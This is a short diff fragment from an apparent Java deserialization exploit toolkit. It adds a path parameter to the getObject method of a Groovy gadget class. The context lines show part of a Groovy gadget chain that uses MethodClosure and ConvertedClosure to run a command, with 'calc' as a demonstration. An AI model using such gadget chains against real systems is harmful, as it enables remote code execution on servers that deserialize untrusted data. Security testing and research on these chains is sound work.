@@ -13,7 +13,7 @@ import java.util.Map;
 public class Groovy implements Gadget {
 
     @Override
-    public Object getObject(String command) throws Exception {
+    public Object getObject(String command,String path) throws Exception {
         //封装我们需要执行的对象
         MethodClosure methodClosure = new MethodClosure("calc", "execute");
         ConvertedClosure closure = new ConvertedClosure(methodClosure, "entrySet");
